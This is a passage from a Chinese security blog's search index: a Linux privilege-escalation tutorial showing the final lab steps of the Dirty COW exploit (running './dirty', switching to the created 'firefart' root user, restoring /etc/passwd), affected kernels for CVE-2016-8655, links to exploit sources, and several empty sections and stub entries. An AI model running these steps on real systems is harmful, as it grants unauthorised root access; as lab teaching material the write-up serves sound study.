href="#步骤四：运行提权程序" class="headerlink" title="步骤四：运行提权程序"></a>步骤四：运行提权程序</h4><blockquote><p>[/tmp/]$ ./dirty 123456  //默认会创建firefart用户，而密码则是为其程序后面的参数123456</p></blockquote><h4 id="步骤五：切换用户身份"><a href="#步骤五：切换用户身份" class="headerlink" title="步骤五：切换用户身份"></a>步骤五：切换用户身份</h4><blockquote><p>[/tmp/]$ su firefart  //切换至提权默认创建的firefart用户  </p><p>[/tmp/]$ id           //查看当前用户信息</p></blockquote><h4 id="步骤六：权限恢复"><a href="#步骤六：权限恢复" class="headerlink" title="步骤六：权限恢复"></a>步骤六：权限恢复</h4><blockquote><p>mv /tmp/passwd.bak /etc/passwd </p></blockquote><h5 id="练习实验环境：bee-boxV1-6"><a href="#练习实验环境：bee-boxV1-6" class="headerlink" title="练习实验环境：bee-boxV1.6"></a>练习实验环境：bee-boxV1.6</h5><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li>更新升级最新 Linux Kernel 源码，并重新编译。</li></ul><h2 id="二：CVE-2016-8655"><a href="#二：CVE-2016-8655" class="headerlink" title="二：CVE-2016-8655"></a>二：CVE-2016-8655</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><blockquote><p>此漏洞可用于未授权进程中执行内核代码，恶意访问者只需要本地普通权限，就可以利用该漏洞提升到管理员权限。<a href="https://www.exploit-db.com/exploits/40871">利用源码</a></p></blockquote><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux Kernel <span class="number">4.4</span><span class="number">.0</span> (Ubuntu <span class="number">12.04</span> <span class="number">14.04</span> <span class="number">16.04</span> Debian <span class="number">7</span> <span class="number">8</span>)</span><br><span class="line">Ubuntu <span class="number">16.04</span>: <span class="number">4.4</span><span class="number">.0</span><span class="number">-51</span>-generic     <span class="comment">//可生效版本</span></span><br><span class="line">Ubuntu <span class="number">16.04</span>: <span class="number">4.4</span><span class="number">.0</span><span class="number">-47</span>-generic</span><br><span class="line">Ubuntu <span class="number">16.04</span>: <span class="number">4.4</span><span class="number">.0</span><span class="number">-36</span>-generic</span><br><span class="line">Ubuntu <span class="number">14.04</span>: <span class="number">4.4</span><span class="number">.0</span><span class="number">-47</span>-generic #<span class="number">68</span>~<span class="number">14.04</span><span class="number">.1</span>-Ubuntu</span><br></pre></td></tr></table></figure><h3 id="实验1-Ubuntu-16-04-内核版本4-4-0"><a href="#实验1-Ubuntu-16-04-内核版本4-4-0" class="headerlink" title="实验1:Ubuntu 16.04(内核版本4.4.0)~"></a>实验1:Ubuntu 16.04(内核版本4.4.0)~</h3><h4 id="步骤一：实验环境准备"><a href="#步骤一：实验环境准备" class="headerlink" title="步骤一：实验环境准备"></a>步骤一：实验环境准备</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h4 id="步骤二：信息收集-1"><a href="#步骤二：信息收集-1" class="headerlink" title="步骤二：信息收集"></a>步骤二：信息收集</h4><h2 id="三：CVE-2017-1000112"><a href="#三：CVE-2017-1000112" class="headerlink" title="三：CVE-2017-1000112"></a>三：CVE-2017-1000112</h2><h2 id="四：CVE-2017-7308"><a href="#四：CVE-2017-7308" class="headerlink" title="四：CVE-2017-7308"></a>四：CVE-2017-7308</h2><h2 id="五：CVE-2018-18955"><a href="#五：CVE-2018-18955" class="headerlink" title="五：CVE-2018-18955"></a>五：CVE-2018-18955</h2><h2 id="六：CVE-2018-5333"><a href="#六：CVE-2018-5333" class="headerlink" title="六：CVE-2018-5333"></a>六：CVE-2018-5333</h2><h2 id="七：CVE-2019-13272"><a href="#七：CVE-2019-13272" class="headerlink" title="七：CVE-2019-13272"></a>七：CVE-2019-13272</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h3 id="实验1-Debian"><a href="#实验1-Debian" class="headerlink" title="实验1-Debian"></a>实验1-Debian</h3><h3 id="实验2-…"><a href="#实验2-…" class="headerlink" title="实验2-…"></a>实验2-…</h3><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h2 id="相关连接"><a href="#相关连接" class="headerlink" title="相关连接"></a>相关连接</h2><ul><li><a href="https://github.com/FireFart/dirtycow">FireFart未编译</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195">多发行版未编译</a></li><li><a href="https://github.com/Brucetg/DirtyCow-EXP">已编译Linux与Android</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之信息收集</title>
      <link href="2021/01/18/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/01/18/Windows%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权之信息收集</title>
      <link href="2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/01/18/Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后渗透专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="2021/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>2021/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>#网络工程师</p><blockquote><p>第一课</p></blockquote><blockquote><p>第二课</p></blockquote><blockquote><p>….</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
